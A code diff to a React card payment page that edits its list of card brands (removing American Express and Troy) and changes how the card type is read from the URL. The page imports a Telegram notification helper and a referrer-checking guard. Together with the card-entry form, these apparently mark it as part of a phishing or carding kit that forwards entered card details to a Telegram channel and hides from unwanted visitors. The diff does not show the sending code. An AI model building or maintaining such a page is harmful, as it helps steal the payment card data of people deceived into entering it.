@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect, useCallback } from "react";
-import { useNavigate, useSearchParams, useParams } from "react-router-dom";
+import { useNavigate, useSearchParams, useLocation } from "react-router-dom";
 import { CreditCard, Lock, Camera, X, ArrowLeft } from "lucide-react";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
@@ -8,8 +8,6 @@ import genzLogo from "@/assets/genz-logo.png";
 import visaLogoImg from "@/assets/visa-logo.png";
 import mastercardLogoImg from "@/assets/mastercard-logo.png";
 import mastercardLogoColorImg from "@/assets/mastercard-logo-color.png";
-import amexLogoImg from "@/assets/amex-logo.png";
-import troyLogoImg from "@/assets/troy-logo.png";
 import discoverLogoImg from "@/assets/discover-logo.png";
 
 const cardOptions = [
@@ -26,18 +24,6 @@ const cardOptions = [
     accent: "#EB001B", accentHover: "#c0000f",
   },
   {
-    id: "amex", label: "American Express", logoImg: amexLogoImg, cvvLength: 4,
-    gradient: "linear-gradient(135deg, #006FCF 0%, #004A8F 40%, #00264D 100%)",
-    gradientBack: "linear-gradient(135deg, #00264D 0%, #004A8F 50%, #006FCF 100%)",
-    accent: "#006FCF", accentHover: "#004A8F",
-  },
-  {
-    id: "troy", label: "Troy", logoImg: troyLogoImg, cvvLength: 4,
-    gradient: "linear-gradient(135deg, #00529B 0%, #003D73 40%, #002244 100%)",
-    gradientBack: "linear-gradient(135deg, #002244 0%, #003D73 50%, #00529B 100%)",
-    accent: "#00529B", accentHover: "#003D73",
-  },
-  {
     id: "discover", label: "Discover", logoImg: discoverLogoImg, cvvLength: 4,
     gradient: "linear-gradient(135deg, #FF6000 0%, #D14700 40%, #8B2F00 100%)",
     gradientBack: "linear-gradient(135deg, #8B2F00 0%, #D14700 50%, #FF6000 100%)",
@@ -48,7 +34,8 @@ const cardOptions = [
 const CardPaymentPage = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
-  const { cardType } = useParams<{ cardType: string }>();
+  const location = useLocation();
+  const cardType = location.pathname.replace('/', '');
   const amount = searchParams.get("amount") || "00";
   const { checking: referrerChecking } = useReferrerGuard();
   const [showCancelDialog, setShowCancelDialog] = useState(false);
